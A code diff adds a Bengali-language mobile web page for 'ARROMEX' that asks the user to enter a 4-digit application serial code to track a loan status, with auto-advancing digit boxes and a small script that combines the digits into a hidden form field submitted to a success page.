@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>আবেদন সিরিয়াল নিশ্চিতকরণ - ARROMEX</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { 
+            background: #f1f5f9; 
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 450px;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .header-section {
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+            color: #ffffff;
+            padding: 35px 20px 25px;
+            text-align: center;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+        }
+
+        .icon-circle {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin: 0 auto 15px;
+        }
+
+        .header-title { font-size: 19px; font-weight: bold; margin-bottom: 6px; }
+        .header-sub { font-size: 13px; opacity: 0.9; line-height: 1.4; }
+
+        .content-body { padding: 30px 20px; flex-grow: 1; }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 25px 0 30px;
+        }
+
+        .otp-input {
+            width: 55px;
+            height: 55px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 2px solid #cbd5e1;
+            border-radius: 12px;
+            background: #f8fafc;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .otp-input:focus {
+            border-color: #2563eb;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
+        }
+
+        .info-note {
+            background: #eff6ff;
+            border: 1px solid #bfdbfe;
+            color: #1e40af;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #2563eb, #1d4ed8);
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .submit-btn:hover {
+            opacity: 0.95;
+        }
+    </style>
+</head>
+<body>
+
+<div class="screen-container">
+    <div class="header-section">
+        <div class="icon-circle">
+            <i class="fa-solid fa-list-ol"></i>
+        </div>
+        <div class="header-title">আবেদন সিরিয়াল কোড</div>
+        <div class="header-sub">আপনার আবেদনটি ট্র্যাক করতে ৪-সংখ্যার সিরিয়াল কোডটি লিখুন</div>
+    </div>
+
+    <div class="content-body">
+        <div class="info-note">
+            <i class="fa-solid fa-circle-info"></i> এই কোডটি দিয়ে পরবর্তীতে আপনার লোনের স্ট্যাটাস যাচাই করা যাবে।
+        </div>
+
+        <form action="success.html" method="GET" id="serialForm">
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required autofocus>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+            </div>
+
+            <!-- মূল কোড ধারণ করার হিডেন ফিল্ড -->
+            <input type="hidden" name="serial_code" id="finalSerial">
+
+            <button type="submit" class="submit-btn">
+                <span>সিরিয়াল নিশ্চিত করুন</span>
+                <i class="fa-solid fa-arrow-right"></i>
+            </button>
+        </form>
+    </div>
+</div>
+
+<script>
+    const inputs = document.querySelectorAll('.otp-input');
+    const finalInput = document.getElementById('finalSerial');
+
+    // এক ডিজিট টাইপ করলে পরের বক্সে অটো যাওয়ার লজিক
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+            updateFinalValue();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+
+    function updateFinalValue() {
+        let code = '';
+        inputs.forEach(input => code += input.value);
+        finalInput.value = code;
+    }
+</script>
+
+</body>
+</html>
